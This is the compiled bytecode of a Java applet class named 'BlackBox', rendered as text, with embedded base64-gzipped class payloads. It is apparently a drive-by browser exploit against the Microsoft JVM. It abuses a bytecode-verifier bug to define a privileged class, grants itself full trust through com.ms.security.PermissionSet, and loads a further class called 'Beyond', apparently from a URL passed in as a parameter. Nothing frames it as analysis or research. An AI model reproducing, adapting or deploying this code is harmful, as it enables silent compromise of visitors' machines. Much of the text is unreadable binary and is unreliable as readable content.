����  - � BlackBox  java/applet/Applet  eurl Ljava/lang/String; xdat UCL_def [B 	Magic_def UCL_def_b64 Magic_def_b64 EQUALS_SIGN B ConstantValue   = 	DECODABET WHITE_SPACE_ENC���� EQUALS_SIGN_ENC���� stop ()V Code init  getParameter &(Ljava/lang/String;)Ljava/lang/String;  
    	     	  "  	  $ decode (Ljava/lang/String;)[B & '
  (  		  *  	  , 
 		  . Dummy 0 <init> 2 
 1 3 VerifierBug 5
 6 3 java/lang/Object 8 getClass ()Ljava/lang/Class; : ;
 9 < dummy_class Ljava/lang/Class; > ?	 6 @ UCL_definition B 		 6 C Magic E myDefineClass )(Ljava/lang/String;[BII)Ljava/lang/Class; G H
 6 I java/lang/Class K newInstance ()Ljava/lang/Object; M N
 L O com.ms.security.PermissionSet Q forName %(Ljava/lang/String;)Ljava/lang/Class; S T
 L U doit W 	getMethod @(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method; Y Z
 L [ !com/ms/security/PermissionDataSet ]
 ^ 3 setFullyTrusted (Z)V ` a
 ^ b com/ms/security/PermissionSet d &(Lcom/ms/security/PermissionDataSet;)V 2 f
 e g getClassLoader ()Ljava/lang/ClassLoader; i j
 L k com/ms/vm/loader/URLClassLoader m value !Lcom/ms/vm/loader/URLClassLoader; o p	 1 q java/lang/reflect/Method s invoke 9(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object; u v
 t w Beyond y 	loadClass { T
 n | java/lang/Throwable ~
  3 geteurl ()Ljava/lang/String; getxdat 
decode4to3 ([B)[B 	([BI[BI)I � �
  �  		  � java/lang/Exception � ([BII)[B java/lang/System � 	arraycopy *(Ljava/lang/Object;ILjava/lang/Object;II)V � �
 � � java/lang/String � getBytes ()[B � �
 � � & �
  �  �   � java/io/ByteArrayOutputStream �
 � 3 java/io/ByteArrayInputStream � ([B)V 2 �
 � � java/util/zip/GZIPInputStream � (Ljava/io/InputStream;)V 2 �
 � � java/io/FilterInputStream � read ([B)I � �
 � � write ([BII)V � �
 � � toByteArray � �
 � � java/io/OutputStream � close � 
 � �
 � � java/io/InputStream �
 � � java/io/IOException � <clinit>8H4sIAExubj8AA41Wa1McRRS9w2t5BQQECTEJECFLXqNGY5SIwgLJxl1Y2YAGqbJ6Z3uXwdnprZ5eIFX+KP1klR/8Af4oy9M9+96BCVXTPd17+t5zz723h3//+/sf6qfH9DZBfRbddUTFrgT2ecX2BCtyaR8eZFIeC4KMWSZowKJ7dVDAnZp01Ts7X39pA1o05ghfSeG9YsGpRbOZM3bO7JpyPVvvKFbw+LpFCcnLOaaAmA4RHvPLdl5J1y+vD9OoRQt5UVIXTPKTrOtIEWB18hrIxaOsRTdSwg8U89UR82rcosEiL9TKFlnH/YQ/i0bMho7FoqmqFGXJQdENFPe5DJpeDa8j7ighQWq6yEus5qkclxU3CFz4gDSZ7rBbP+e5wrGBAgvAYSI06XOlxcP+CHyKmnR40BnlfuEMHgEYy2V9VuFBlTk4nwiqwnOddxY97HFZYT4r8wr3VVP0nAHDygS/VJKlBCIGD/ia/KWbyYQolTzX5zo1QFu03PDAqlUPsC0pLgIuN81qV4KU5l/KiLJOq+Zfyklx6hZcdcCLrgR/bCbgQYth0eMextWWhvYeV+n9lmrGtOsXTdlYtJLsrYC1ti0D0zLrEBFdBoHs1SoFLt/oYoKMZQ5WodQI7WpzLUEmUTxSbYsLX5fIYdqiuWQ64twRtAuUqLYj+5PhNlcmFTyvmILf+xF+oy2Og29qP9tomJfvdzAT06KIanTn0uFVpTVP0FOLZlpWmr+gHVjxrBZ0Fvlq8poq32aK6UrX3LXWOg9bpuQ/SPYoe9s55c5vaE9Um/a3K2SjYoz3W8mOEy2gMb/kSA41t8M+DMuxk4iul7X3IBvKvFkruiLludVWfhpU68zrDdAE4uBMWz1tBtCfM5T42tV15Qo77VdrKoTCwhSKYz9suVSj5VaS8T2nJZiTvCLOea7rzkKPJXtLIB3mvhtsDI26vqsaRTaMmNIV3CEWLV4hxIWyDUIrwIrFXgKzsLEdcUMuXZuQMBl3OhJbZ91uZB6SgU1brWx6nrjguL8Hksc6nhEdsyn4BO0jjK4bYk+oXVHzi22VvhqRsuOoq2WqXG/m5r2q5e6N6rpreOiF1nvDXEA9eaoHzJDlAMkZpzw9GsX39xBad7bxE80Oycub8tt1PU5L+J7pz9okjdAgDeFtnhI0jN0xvPdhd57G6UZzPYH1ZMcanUpT5rs4TTNm/pBmzTxHH5l5Hvb0fJMWzHyLPjbzbbpj5ruwp+fF+rxEy4bHMt2jT7BewWoBc5/2aP1hMKsYhzATJTHeN+P1uEd41uhBHXcTj47b+rML9imehwC3YFYU7CkN4B+cJ3HWniF0Gzb76DOsBrD3uTlwJ4LmqNn5Fs8GJPiCvmwz3hdlfAvjM/qqLXIrMvIdKPucvo4zl0ayv6H1NnMUaS4Ddi/AM07wHMYN+i4W9wbj97QZR+8txi1KxcFO8GzH5+9XBLFDu7HkChhfxnst4XkFBeNS4eJ5Hc+ugvEHCB3jtYoxixZpVddeTDgKqKzJTAPXH4m7xPgjHURajo7sd4x5k0uNW6ozGHzwFx21aIcl/hwGdTX+bOL66X9wlOgFLwwAAA== �hH4sIAEFubj8AA4WQz0rDQBDGv22arqlR22rVm/TWaGUfoOKlHiOKYu9rspYtuwlkk0AfS1AEDz6ADyWOseKxc5hv/vwYPubz6/0DHs5xzOGF2MY+g38tFzohraWpFMdWFzvoBfAxpOFVZe2KobeUtRRGZgtx87hUScnQTnNNMkjVk6xMeasKq53TeeYYOhc60+UlRxDgCC2GkyS3wjpRW2FymapCPNzFMyOdi5s2RIhDujnLU8UwijfgU7r4xziVVIUuV+Lfwb0qiYjGceN+uoGM5iHaGDB442jOsYcRGL3gJ1pUkTHKfer69BOf1D99Q+e5ARi6OFivh+t1cPYCPnnF7i+Cb9uYGoB1AQAA � 
SourceFile BlackBox.java !     
              	     
 	                        	                     
              �            �     �*� �  *!� � #*� %� )� +*� -� )� /� 1Y� 4L� 6Y� 7M,+� =� A,*� +� D,F*� /*� /�� JN-� P:� L:+� =SR� VS-X� \:� ^Y� _:� c� eY� h:*� =� l� n:	+	� r� 9:

+S
S
� xW	z� }N-� PW� L�    � �     2           *� ��      � �           �  �      � �           � #�     
 � �     5     )�L*+� �=�N6� -+3T����-�     
 � �     �     �*`3=� /� �*33 �~x� �*`33 �~x�6,|�T�*`3=� K� �*33 �~x� �*`33 �~x�� �*`33 �~x�6,|�T,`|�T�� �*33 �~x� �*`33 �~x�� �*`33 �~x�� �*`33 �~�6,z�T,`z�T,`�T�:�  � � � �   	 & �     �     �hl>�:6�:666	6
6`� X*3~6	� �	36

�� 8
� /�	T� � �`66	=� � � ������:� ��     	 & '     �     �*� �L++�� �L+3 �~+3x�~�=+� �+�� ��� �N:: �:6� �Y� �:� �Y+� �N� �Y-� �:� �Y6� � ����� �L� :� � ,:	� 	�:� �� :
� �� :
-� �� :
�+N-�  A } � � A � �   � � � � � � � � � � � �    �          �ų %ǳ -�Y�TY�TY�TY�TY�TY�TY�TY�TY�TY	�TY
�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY �TY!�TY"�TY#�TY$�TY%�TY&�TY'�TY(�TY)�TY*�TY+>TY,�TY-�TY.�TY/?TY04TY15TY26TY37TY48TY59TY6:TY7;TY8<TY9=TY:�TY;�TY<�TY=TY>�TY?�TY@�TYATYBTYCTYDTYETYFTYGTYHTYITYJ	TYK
TYLTYMTYNTYOTYPTYQTYRTYSTYTTYUTYVTYWTYXTYYTYZTY[�TY\�TY]�TY^�TY_�TY`�TYaTYbTYcTYdTYeTYfTYg TYh!TYi"TYj#TYk$TYl%TYm&TYn'TYo(TYp)TYq*TYr+TYs,TYt-TYu.TYv/TYw0TYx1TYy2TYz3TY{�TY|�TY}�TY~�T� ��      �    �